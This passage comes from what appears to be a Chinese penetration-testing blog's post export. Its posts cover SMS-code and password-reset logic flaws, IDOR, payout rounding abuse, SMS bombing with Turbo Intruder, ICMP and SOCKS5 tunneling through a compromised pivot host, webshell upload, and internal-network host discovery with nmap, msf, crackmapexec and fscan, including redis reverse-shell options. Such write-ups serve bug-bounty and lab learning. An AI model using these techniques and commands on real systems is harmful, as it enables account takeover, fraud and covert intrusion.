即登录了别人的账号\n","date":"2025-09-13T00:00:00Z","image":"http://localhost:1313/images/71.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E9%AB%98%E5%8D%B1/","title":"【渗透测试】任意用户登录（高危）"},{"content":"短信验证码和手机号未绑定导致任意用户注册\n复现 A手机号码注册且发送的验证码可让B，C，D的手机号码使用且注册成功。\n手机号码\n1 A 130****2912 ,B 16666666666，C18888888888，D 19999999999 这里原手机号是A的，我把手机号替换成了B C D的。\n这里是注册成功的页面\n","date":"2025-09-13T00:00:00Z","image":"http://localhost:1313/images/72.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E9%AB%98%E5%8D%B1/","title":"【渗透测试】任意用户注册（高危）"},{"content":"ew+pingtunnel组合建立scoks5隧道 介绍 1 2 3 EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。 需要root或者administrator/system权限。 环境 A攻击机器：windows11（自己的电脑）（10.10.10.131）\nB代理机器（VPS，服务端）：kali（10.10.10.133）\nC跳板机器：windwos Server 2012（已攻入的服务器）（20.20.20.134，10.10.10.135）\nD目标机器：centos 7（20.20.20.130）（搭建了一个小皮靶场）\n实验效果 在已经拿到公网win7服务器的前提下，通过ew与pingtunnel搭建能通往winserver2008的隧道，获取winserver2008的服务器权限。\n实验准备 工具：ew、pingtunnel、proxifer（代理工具）\n1 2 3 https://github.com/idlefire/ew https://github.com/esrrhs/pingtunnel proxifer官网自行下载 实验步骤 B代理机器执行 1 ./ew_for_linux64 -s rcsocks -l 10080 -e 8898 10080作为连接隧道的端口，8898作为隧道的通道，可以想象为，通向内网主机的路口为10080，走的这条路为8898。8898上所有的人（流量）都会通往10080这个路口。\nB代理机器执行 1 ./pingtunnel -type server -noprint 1 -nolog 1 意思是将ew启动的sock5协议转换为icmp协议来隐藏传输\nC跳板机器执行 1 2 3 pingtunnel.exe -type client -l 127.0.0.1:9999 -s 10.10.10.133 -t 10.10.10.133:8898 -sock5 -1 -noprint 1 -nolog 1 10.10.10.133：为VPS地址。 意思是8898这条路上的sock5流量信息隐藏为icmp类型的数据在本C跳板机的9999端口进行转发。\nC跳板机器执行 1 ew.exe -s rssocks -d 127.0.0.1 -e 9999 在本C跳板机9999端口开启转发流量\n如果出现错误，请以管理员身份运行即可。\nkali上出现OK字样时表示代理搭建完成 使用A机器（自己的机器）win11，进行代理端口：\n1 10.10.10.133 10080 成功访问到D目标机器小皮面板。\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/62.webp","permalink":"http://localhost:1313/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/","title":"【ICMP协议隧道代理】ew+pingtunnel组合建立scoks5隧道"},{"content":"复现 1 在接收手机验证码时候，可以注意返回的参数，看看收到的验证码有没有回显在相应包 1 有些时候返回的并不是这种明文，而是以base64编码形式或其他形式，在挖掘过程中留意留意 ","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/64.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%89%8B%E6%9C%BA%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E6%98%BE%E9%AB%98%E5%8D%B1/","title":"【渗透测试】手机验证码回显（高危）"},{"content":"复现 步骤一 挖掘一些业务的时候，很多系统都会放在一个统一认证中去访问，你只有登录统一认证才能去访问某个系统，那么当我们在挖掘的时候，遇见这样的环境怎么办呢？\n当然是最简单的修改返回包查看是否可以未授权查看内容，当然很多时候都是白给，但是我们还是要尝试一下撒。\n当我们扫描出xxxx.com存在一个子域名，我们去访问站点http://stde.xxxx.com发现他要跳转到一个统一认证的页面，此时我们进行抓包对每一个数据包进行分析：\n每一次放包都会自动跳转，但是发现该数据包时，我将箭头所指的{}删掉，发现就可以进入系统卡死在功能点页面，因为页面只有功能点没有数据，我就继续点击功能点\n点击任意功能点继续抓包：出现如图的数据包的时候将401，提示我们需要先登录才能进行访问\n步骤二 常规操作，将401改为200，发现居然成功访问数据：\n步骤三 可以发现整个站点功能点都可以用这个方法查看数据:\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/65.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%951/","title":"【渗透测试】统一认证系统的挖掘方法1"},{"content":"0x01 漏洞描述 在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准\n0x02 漏洞测试工具 Burp html配合xss语句的文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; alert(\u0026#34;testxss\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 0x03 漏洞点及测试方法 漏洞点：存在文件上传的地方\n测试方法： 在文件上传的时候上传Html嵌套xss语句\n0x04 案例1 一次的众测活动中，看见一个营业职照的上传点，能上传马子但是不解析，于是随手改为html上传成功。赏金（800r)\n0x04 案例2 某src的文件上传xss（赏金100r） 同样的在页面找到文件上传的地方\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/66.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0html%E5%B5%8C%E5%A5%97xss%E8%AF%AD%E5%8F%A5/","title":"【渗透测试】文件上传html嵌套xss语句"},{"content":"复现 1 2 https://xxxx/login 用自己的账号，登录后，来到个人中心处，点击修改邮箱 1 输入，邮箱后，点击获取验证码 1 利用burpsuite的爆破模块，随便设置参数点，进行爆破 ","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/63.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%82%AE%E4%BB%B6%E8%BD%B0%E7%82%B8%E4%B8%AD%E5%8D%B1/","title":"【渗透测试】邮件轰炸（中危）"},{"content":"复现 这里我们可以看到，在评论这里，有自己的发言，和别人的评论。我们点击回复，随便输入，然后点击发送，抓包，就可以看到别人的comment_id:\n越权撤回评论，我们在回复的时候上面还携带了：\n1 \u0026#34;comment_id\u0026#34;:\u0026#34;7d4fdf0cee90fdb65xxxxxxxxx\u0026#34; 这个就是别人的内容id，我们点击自己的评论，点击撤回，抓包。\n我们只需要把这里的comment_id，替换成别人的内容id，就可以造成越权撤回任意评论内容。\n替换成别人的id:放包，成功\n漏洞验证：可以看到，这里的那条评论已经撤回了。\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/69.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%B6%8A%E6%9D%83%E6%92%A4%E5%9B%9E%E9%AB%98%E5%8D%B1/","title":"【渗透测试】越权撤回（高危）"},{"content":"前言 挖洞是一个需要思维的，而不是一成不变的模仿，做到举一反三，赏金还愁什么呢，在星球刚创立的时候我们就发布了四舍五入的支付漏洞，大家在挖掘的时候，看见的特征点就是自己的钱包的0.00的时候就要想到这个漏洞，但是也要学会变通。\n0X01:发现过程： 我某天乱逛的时候看见了一个和某宝差不多可以购买J金的项目，然后就随手下载了app，打开一个，发现钱包余额是0.00的字眼，我随手充值了1.01 ,1.005,1.05但是最后充值都是很正确的。\n然后我也放弃了这个漏洞的想法，我晚上睡觉的到时候，我又把这个app拿出来看（因为我买了某金嘛，我就想看看我赚没） 晚上拿出来看的时候我就发现了提线这个功能点：\n我就在想，我们充值都可以四舍五入，那么提现也可以撒！！！ 于是起床开始测试：\n首先提现一元的时候将数据包改为提现1.005看看会是什么情况：\n当显示成功的时候，我看见是1元的时候我也以为失败了：\n看到余额变成2.04的时候我心里也是凉凉的 但是！！！！！！！！！！！！！！！！！！！！！\n没过多久我vx发来了收款信息：\n直接乐翻天：\n0X02:反思 就是要熟悉漏洞点和经常去琢磨，就比如上面一样，四舍五入大家都知道，但是大家的思维都被作者的充值思维所局限，没有去思考，只会在充值的时候想到4舍五入，我的猜测就是这个项目可能在支付和提现的两个功能点都有，但是支付的被发现了，而提现的点就被放过了，所以在测试漏洞的时候，可以多思考和多笔记去分析。\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/68.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5re/","title":"【渗透测试】支付漏洞四舍五入re"},{"content":"前言 在我挖掘漏洞的时候，其实越权是普遍存在，一个get请求中的显眼参数，一个post请求中不明显的参数，这些都是需要我们去思考的。\n0x01 身份鉴权不严的挖法 身份鉴权不严（原理就不解释了）这个漏洞点可以说存在整个web站点的任何一个地方，所以我们挖漏洞的时候，一定要养成保存数据包的习惯，这是我们挖越权很重要的思路，再者就是A页面不存在越权，但是保不准B页面就不存在越权，所以我们在挖掘的时候，不要放过任何地方，总而言之就是：善于观察参数\n0x02 电商站点的越权处 当我们在测试电商站点的时候，往往都有一个收货地址，在收货地址这个功能点下面一般有增加地址，修改地址，和删除地址，这几个功能点，这几个功能点就是我们测试越权的关键点，如果增加地址和修改地址存在越权，那么你说高危是不是就来了？\n0x03 案例 某度的商城我们点击付款的页面时看见了订单号和修改地址这个功能点\n然后我们准备另外一个账号购买相同的物品，然后生成订单记住订单号：\n然后我们抓包，换成我们另一个账号的订单：\n放包，就成功为我们第一个账号的地址：\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/70.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%94%AF%E4%BB%98%E6%94%B6%E8%8E%B7%E5%9C%B0%E5%9D%80%E8%B6%8A%E6%9D%83/","title":"【渗透测试】支付收获地址越权"},{"content":"复现 如果遇到重置密码是分几步走的（比如先验证验证码是否正确，然后再让你改密码）， 这种可以注意验证验证码的响应数据包\n像这里， 响应包没有出现任何可校验的信息，比如token，sign之类的， 百分之90存在重置任意用户的漏洞\n输入别人账户，直接修改验证的响应包，进入页面重置即可\n","date":"2025-09-12T00:00:00Z","image":"http://localhost:1313/images/67.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","title":"【渗透测试】重置密码逻辑漏洞"},{"content":"拓扑图 目标机器搭建了一个BEES靶场。\n使用kali上传webshell上线BEES靶场。\n靶机展示 kali攻击机\ncentos 7 跳板机\nwindows server 2012 目标机器\n使用场景 当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。\n使用简单方便，可以更快的对目标网站进行渗透测试。\n攻击步骤 1.kali对跳板机进行一次密码喷洒，获取跳板机的ssh登录密码，登录到跳板机后，对靶机进行一次信息收集。（发现靶机有两个网卡，并发现20段的主机20.20.20.129主机开启了80端口。）然后我们需要用kali，进攻20段主机，这时候是不通的，无法进攻。这时候我们就需要设置一个代理spp，监听8888端口。实现socks5代理。\n2.上传spp到跳板机上，然后在kali上运行spp，让他作为服务端进行启动。监听8888端口，然后centos的spp反向连接kali的8888端口，然后kali服务端与centos进行协商通讯，1080端口作为socks5代理，在kali上监听，在kali上设置代理，就可以直接与20段进行通讯，对内部网络进行渗透。\n步骤一 1 2 使用hydra对跳板机进行密码喷洒，获取ssh密码，并登录到跳板机上。 使用spp，以服务器的形式开启kali的8888端口进行监听。 1 2 3 4 使用spp，以服务器的形式开启kali的8888端口进行监听。 ./spp -type server -proto tcp -listen :8888 -proto ricmp -listen 0.0.0.0 -nolog 1 -noprint 1 \u0026amp; 以服务器的形式运行，协议为tcp，监听8888端口，封装到ricmp协议，在本地进行监听 不保存日志，不在控制台打印日志，在后台运行。 同时kali机器监听8888端口。 如下图，spp已经成功监听8888端口。\n步骤二 可以使kali通过socks5代理直接访问20段的web网站\n1 2 使用scp命令，把spp上传到跳板机上的tmp目录下: scp spp root@10.10.10.128:/tmp 1 到跳板机上查看tmp目录，发现已经成功上传 1 2 在跳板机上运行spp，开启socks5代理，连接spp服务器kali的spp服务器8888端口上，以1080端口进行通信 ./spp -name “16” -type reverse_socks5_client -server 10.10.10.129:8888 -fromaddr :1080 -proxyproto tcp -proto tcp -nolog 1 -noprint 1 \u0026amp; 1 这时候kali上就会出现监听1080端口 1 2 设置socks 5代理 vim /etc/proxychains4.conf 1 2 测试一下是否代理成功。 proxychains rdesktop 20.20.20.129 步骤三 在目标网站中进行渗透测试，上传webshell，拿下目标服务器。上线蚁剑\n1 2 目标服务器有一个web靶场，这是我搭建的一个靶场，该靶场存在一个任意文件上传漏洞，可以通过改Content-Type:image/png，进行上传php文件。 这里上传过程就不展示了，详细靶场情况可以参考，BEES靶场通过教程 获取到上传文件地址之后，就可以使用webshell连接工具直接连接了，这里有很多工具，就不说了，我这里使用的蚁剑进行连接，需要注意的是需要用蚁剑进行socks5代理进行连接上线\n我这里用burp进行socks5代理了，就直接代理8080端口了。\n1 2 3 直接添加上传文件地址，输入密码，即可连接 http://20.20.20.129/upload/img/20240606101139614.php 到这一步我们已经成功的上线目标服务器了。 ","date":"2025-09-11T00:00:00Z","image":"http://localhost:1313/images/60.webp","permalink":"http://localhost:1313/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"【socks 5反向代理】spp内网穿透工具的使用"},{"content":"介绍 用于探测 Swagger/OpenAPI 文档并尝试未授权访问接口，辅助安全自查。识别 swagger-ui 页面、swagger-resources 入口、Swagger 1.x/V2/V3 文档，在谨慎策略下对接口进行 GET/POST 探测并生成 Excel 报告。\n下载地址 1 https://github.com/mk4no1/SwaggerAH 快速开始 1 2 3 4 5 6 # 单目标扫描（自动识别入口类型：swagger-ui / api-docs / swagger-resources） python swagger.py -u https://example.com/swagger-ui/index.html # 忽略文档内 servers，强制使用初始域名（遇到内网域名或IP直接使用此参数） python swagger.py -u https://example.com/v3/api-docs --force-domain 1 2 3 4 5 # 批量扫描（每行一个 URL） # urls.txt: # https://a.com/v3/api-docs # https://b.com/swagger-ui/index.html python swagger.py -f urls.txt 红框或者error忽略即可\n安装与依赖 Python 3（本人Python 3.10.11）\n依赖安装：\n1 pip install requests loguru selenium openpyxl urllib3 使用说明 常用参数\n-u, --url：单个目标（支持 swagger-ui、api-docs、swagger-resources） -f, --file：批量目标文件（逐行 URL） --force-domain：忽略文档内 servers，强制使用初始域名 请求与参数策略（宁可漏报也不可误删误改）\n仅尝试 GET、POST 自动填充占位参数： path 参数：用占位值替换路径变量（数字就填充1，字母填充a） query 参数：填充简单占位值 body(JSON)：按 schema 尝试生成示例 命中高风险关键字的 URL 自动跳过 报告说明 扫描结束生成 YYYYMMDDHHMM_xxx.xlsx： 所有API：记录发现的所有路径，标注“调用/过滤” 已调用API：记录请求方法、URL、参数、状态码、截断后的响应 已过滤API：记录被策略拦截的接口与原因。 ","date":"2025-09-11T00:00:00Z","image":"http://localhost:1313/images/61.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7swagger-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/","title":"【工具】Swagger 未授权检测工具"},{"content":"这里我主要记录一下，学习一下经验，侵权立删。\n复现过程 开局一个纵向的短信炸弹，使用burp的Turbor并发插件，噼里啪啦给自己发了几十条短信。\n点开短信，发现了一个神奇的现象，通过并发操作发送的短信存在一定的可预测性，即前三位保持不变，变动后三位，有点意思～\n众所周知，当系统存在纵向短信炸弹的时候，大概率也存在横向短信炸弹（这个逻辑反过来不太行，即存在横向短信炸弹，不一定存在纵向短信炸弹）。猜测应该并发的时候生成的短信可能都是前三位保持不变，变动后三位这个逻辑？那么思路清晰了，整一个横向+纵向结合的短信炸弹，给自己发送短信的同时也给其他手机发送短信，那不就能基本猜测出来验证码的前三位嘛，后三位，也基本都是挨在一起的，就算不挨在一起，总共也就1000个值，遍历一下就好啦～\n准备一个1.txt文档，里面主要放置着自己的手机号，其中掺杂着一个测试手机号\n使用Turbor并发插件，在telephone处设置%s的标记，然后在代码处，使用race的代码，并将代码改为\n1 2 for word in open(\u0026#34;/Users/xxx/Desktop/1.txt\u0026#34;): engine.queue(target.req, word.rstrip()) 点击攻击，成功发送短信。\n查看自己手机号上看到的短信内容，爆破一下18888888888手机号的后三位内容，成功爆破出来18888888888手机号的验证码，顺利把危害从短信炸弹升级成了任意用户登录\n","date":"2025-09-10T00:00:00Z","image":"http://localhost:1313/images/56.webp","permalink":"http://localhost:1313/p/%E6%90%AC%E8%BF%90%E6%A8%AA%E5%90%91%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9--%E7%BA%B5%E5%90%91%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/","title":"【搬运】横向短信炸弹 + 纵向短信炸弹 ≈ 任意用户登录"},{"content":"0x00 简介 在渗透测试中可以根据⽬标主机的情况，上传⼯具进⾏主机存活探测，也可以借助内⽹代理或路由转发对⽬标主机所处的局域⽹发起探测。\n测试⼈员可以根据当前渗透环境，选⽤ICMP、NetBIOS、UDP、ARP、SNMP、SMB等多种⽹络协议。按照协议类型，下⾯介绍使⽤常⻅⼯具来发现内⽹存活主机的⽅法。\n0x01 探测域内存活主机 协议对⽐表:\n协议 最佳适⽤场景 规避检测技巧 ARP 局域⽹快速精准探测 伪造源MAC地址 ICMP 跨⽹段基础存活探测 随机延迟发送、TTL伪装 UDP 防⽕墙绕过探测 使⽤⾮常⽤端⼝(5353/161等) SMB Windows主机专项探测 匿名空会话连接 NetBIOS 主机名和⻆⾊识别 结合137/138/139端⼝扫描 1. 利⽤ICMP协议快速探测内⽹ ICMP (Internet Control Message Protocol，因特⽹控制消息协议）是TCP/IP 协议簇的⼀个⼦协议，⽤于⽹络层的通信，即IP主机、路由器之间传递控制消息，提供可能友⽣在通信环境中的各种问题反馈。通过这些信息，管理员可以对发⽣的问题做出诊断，然后采取适当的措施解决。 在实际利⽤中，可以通过ICMP循环对整个⽹段中的每个IP地址执⾏ping 命令，所有能够ping 通的IP地址即为内⽹中存活的主机。 在⽬标主机中执⾏以下命令：\nfor 1 2 3 4 5 6 for /L %I in (1,1,254) Do @ping -n 1 -w 100 192.168.12.%I | findstr /i \u0026#34;TTL=\u0026#34; 代码解释： -n 1 ：每个IP只发送1个ICMP包（加快扫描速度）。 -w 100 ：等待回复的超时时间设为100毫秒（根据⽹络质量调整）。 /i： 忽略⼤⼩写，确保匹配 或 。 | ：管道符，将 ping 结果传递给 findstr 过滤。 PowerShell 创建⼀个scanip.ps1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function Invoke-StealthPing { param($subnet, $start, $end, $threads=20) $block = { param($ip) Start-Sleep -Milli (Get-Random -Min 100 -Max 800) if (Test-Connection $ip -Count 1 -Quiet -EA 0) { [Convert] ToBase64String([Text.Encoding] UTF8.GetBytes($ip)) } } $jobs = @() 1 254 | % { $ip = \u0026#34;$subnet.$_\u0026#34; while ($jobs.Count -ge $threads) { $completed = $jobs | ? State -ne \u0026#39;Running\u0026#39; $completed | Receive-Job $jobs = $jobs | ? State -eq \u0026#39;Running\u0026#39; } $jobs += Start-Job $block -Arg $ip } $jobs | Wait-Job | Receive-Job | % { [Text.Encoding] UTF8.GetString([Convert] FromBase64String($_)) } } nmap 1 nmap -sn -PE 192.168.12.0/24 利⽤NetBIOS快速探测内⽹ NetBIOS是局域⽹程序使⽤的⼀种程序编辑接⼝（API），为程序提供了请求级别服务的统⼀的命令集，为局域⽹提供了⽹络及其他特殊功能。\nnbtscan是⼀个命令⾏⼯具，⽤于扫描本地或远程tcp/ip⽹络上的开放NEtBIos名称服务器。在实际利⽤时，向局域⽹的每个IP地址发送NetBIOS状态查询，可以获得主机名、MAC地\n址等信息。 NBTScan是⼀款⽤于扫描Windows⽹络上 NetBIOS名称的程序，⽤于发现内⽹中存活的 Windows 主机。 NBTScan可以对给定IP范围内的每个IP地址发送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，会列出它的IP地址、NetBIOS计算机名、登录⽤户名和MAC地址。总之，NBTSCAN可以获取到PC的真实IP地址和MAC地址。\n将nbtscan.exe 上传到⽬标主机（⽹⻚搜索下载即可），执⾏以下命令：\n下载地址：\n1 2 http://unixwiz.net/tools/nbtscan.html#download https://github.com/charlesroelli/nbtscan 1 nbtscan.exe 192.168.199.1/24 nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 nmap -sU -p 137 script nbstat.nse 192.168.12.0/24 关键参数说明： 1. -sU - 功能：启用 UDP 扫描模式，用于发现目标主机开放的 UDP 端口。 - 背景：UDP 是无连接协议，扫描难度大于 TCP，需通过发送 UDP 包并分析响应判断端口状态。 2. -p 137 - 功能：指定扫描目标的 UDP 137 端口。 - 背景：137 端口是 NetBIOS 名称服务（NBNS）的标准端口，用于计算机在局域网中解析 NetBIOS 名称（如 Windows 计算机名）。 3. --script nbstat.nse - 功能：执行 Nmap 脚本引擎（NSE）中的nbstat.nse脚本。 - 脚本作用：通过 NetBIOS 协议获取目标主机的详细信息，包括： - 计算机名、工作组 / 域名称 - 已注册的 NetBIOS 服务（如文件共享、打印服务） - 用户名（部分情况下可泄露） - 操作系统类型（通过分析响应特征推测） 4. 192.168.12.0/24 - 功能：指定扫描的目标 IP 范围，即192.168.12.1到192.168.12.254的所有主机。 基于UDP发现存活主机 nmap UDP (User Datagram Protocol，⽤户数据报协议）是⼀种⽤于传输层的⽆连接传输的协议，为应⽤程序提供⼀种不需建⽴连接就可以发送封装的IP数据包的⽅法。 在实际利⽤中，可以将⼀个空的UDP报⽂发送到⽬标主机的特定端⼝，如果⽬标主机的端⼝是关闭的，UDP 探测就⻢上得到⼀个ICMP端⼝⽆法到达的回应报⽂，这意味着该主机正在运⾏ 。 如果到达⼀个开放的端⼝，⼤部分服务仅仅忽略这个空报⽂⽽不做任何回应 。Unicornscan是Kali Linux平台的⼀款信息收集⼯具，提供了⽹络扫描功能。 执⾏以下命令，通过UDP协议扫描内⽹的存活主机\n1 nmap -sU 192.168.12.0/24 Unicornscan kali⾃带 macos linux\n命令：\n1 unicornscan -mU 192.168.12.0/241-65535 通过arp扫描探测内⽹ ARP (Address Resolution Protocol，地址解析协议）是⼀个通过解析⽹络层地址来找寻数据链路层地址的⽹络传输协议，⽤于⽹络层通信。主机发送信息时，将包含⽬标IP地址的ARP请求⼴播到局域⽹上的所有主机，并接收返回消息，以此确定⽬标的物理地址﹔收到返回消息后，将该IP地址和物理地址存⼊本机 ARP缓存，并保留⼀定时间，下次请求时直接查询ARP缓存，以节约资源。 在实际利⽤中，可以向⽹络发送⼀个ARP请求，若⽬标主机处于活跃状态，则其⼀定会回应⼀个ARP响应，否则不会做出任何回应。\narp-scan⼯具 下载地址：\n1 https://gitcode.com/open-source-toolkit/36a6c/blob/main/arp-scan-windows--master.zip 命令：\n1 ./arp-scan.exe -t 172.16.41.1/24 msf 1 2 3 4 5 6 7 8 9 10 11 启动msf msfconsole msf \u0026gt; use auxiliary/scanner/discovery/arp_sweep msf \u0026gt; show options msf \u0026gt; set interface eth0 msf \u0026gt; set smac 000c:2992:fd:85 msf \u0026gt; set rhosts 192.168.174.1/24 msf \u0026gt; set threads 20 msf \u0026gt; set shost 192.168.174.131 (伪造源ip) msf \u0026gt; run 基于SMB协议发现存活主机 SMB （ 端 ⼝ 445 ） ⼜ 称 为 ⽹ 络 ⽂ 件 共 享 系 统 (Common Internet File System ， CIFS ） 协议，是⼀种应⽤层传输协议，主要功能是使⽹络上的机器能够共享计算机⽂件、打印机、串⾏端⼝和通信等资源。CIFS消息⼀般使⽤NetBIOS或TCP发送，分别使⽤139或445端⼝，⽬前倾向于使⽤445端⼝。 在实际利⽤中，可以探测局域⽹中存在的SMB服务，从⽽发现内⽹的存活主机，多适⽤于Windows主机的发现。\n1 nmap -p 445 open -T4 192.168.12.0/24 -oG smb_hosts.txt CrackMapExec （简称 CME) 是⼀款⼗分强⼤的后滲透利⽤⼯具，在 Kali Linux 上可以直接使⽤ apt-get 命令进⾏安装。CrackMapExec 能够枚举登录⽤户、枚举 SMB 服关表、执⾏ WIRM 攻 击 等 功 能 ， 可 以 帮 助 测 试 ⼈ 员 ⾃ 动 化 评 估 ⼤ 型 城 ⽹ 络 的 安 全 性\n下载地址：\n1 https://github.com/Porchetta-Industries/CrackMapExec/releases 命令：\n1 crackmapexec smb 172.16.41.1/24 TCP协议扫描 三次握⼿ 四次挥⼿\nnmap 1 2 3 4 5 6 # 基础扫描（SYN半开扫描） nmap -sS -T4 192.168.1.0/24 # 精准服务识别 nmap -sV -sC -O -p1-65535 192.168.1.1/24 -oA full_scan # 规避防⽕墙 nmap -f mtu 24 data-length 100 -D RND5 scan-delay 192.168.1.0/24 masscan 1 2 3 4 # 安装 git clone https://github.com/robertdavidgraham/masscan make -j # 扫描B段80/443端⼝ ./masscan 10.0.0.0/8 -p80,443 rate 100000 rustscan 1 2 3 4 # 安装 docker pull rustscan/rustscan # 扫描并⾃动调⽤Nmap rustscan -a 192.168.1.0/24 -A -sC 扫描域内端⼝ 端⼝的banner信息 ，端⼝上运⾏的服务，常⻅应⽤的默认端⼝\n利⽤telnet命令进⾏扫描 Telnet 协议是tcp/ip协议族的⼀员，是Internet远程登陆服务的标准协议和主要形式。\n1.⾸先得开启服务\n1 2 3 4 telnet 192.168.1.1 22 REM 批量扫描IP段（需提前启⽤Telnet客户端） for /l %i in (1,1,254) do @telnet 192.168.1.%i 80 \u0026gt; nul echo 192.168.1.%i:80 open 端⼝banner信息 如果通过扫描发现了端⼝，可以使⽤客户端连接⼯具或者nc，获取服务端的Banner信息。获 取 Banner 信 息 后 ， 可 以 在 漏 洞 库 中 查 找 对 应 cve 编 号 的 Poc 、 exp 、 在 exploitDB 、seebug等平台上查看相关的漏洞利⽤⼯具，然后到⽬标系统中验证漏洞是否存在，从⽽有针对性地进⾏安全加固。\n1 2 3 4 5 6 7 8 nc -nv 127.0.0.1 22 ⽂件共享服务端⼝（21、22、69、2049、139、389） 远程连接服务端⼝（22、23、3389、5900、5632） Web应⽤服务端⼝（80、443、8080、7001、7002、8089、9090、4848、1352） 数据库服务端⼝（3306、1433、1521、5432、6379、5000、9200） 邮件服务端⼝（25、110、143） ⽹络常⻅协议端⼝（53、67、68、161） ⾃动化信息收集 fscan 下载：\n1 https://github.com/shadow1ng/fscan 使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 fscan -h ip/24 -p port -o .txtc ./fscan -h 192.168.101.1/24 启动fscan并扫描⽹段 ./fscan.exe -h 192.168.x.x 默认使⽤全部模块 ./fscan.exe -h 192.168.x.x -rf id_rsa.pub redis 写私钥 ./fscan.exe -h 192.168.x.x -c whoami ssh爆破成功后，命令执⾏ ./fscan.exe -h 192.168.x.x -m ms17010 指定模块 ./fscan.exe -h 192.168.x.x -m ssh -p 2222 指定模块ssh和端⼝ ./fscan.exe -h 192.168.x.x -h 192.168.1.1/24 C段 ./fscan.exe -h 192.168.x.x -h 192.168.1.1/16 B段 ./fscan.exe -h 192.168.x.x -h 192.168.1.1/8 A段的192.x.x.1和192.x.x.254,⽅便快速查看⽹段信息 ./fscan.exe -h 192.168.x.x -hf ip.txt 以⽂件导⼊ ./fscan -h 192.168.1.1/24 -np -no -nopoc (跳过存活检测 、不保存⽂件、跳过web poc扫描) ./fscan -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥) ./fscan -h 192.168.1.1/24 -rs 192.168.1.16666 (redis 计划任务反弹shell) ./fscan -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执⾏) ./fscan -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端⼝) ./fscan -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt 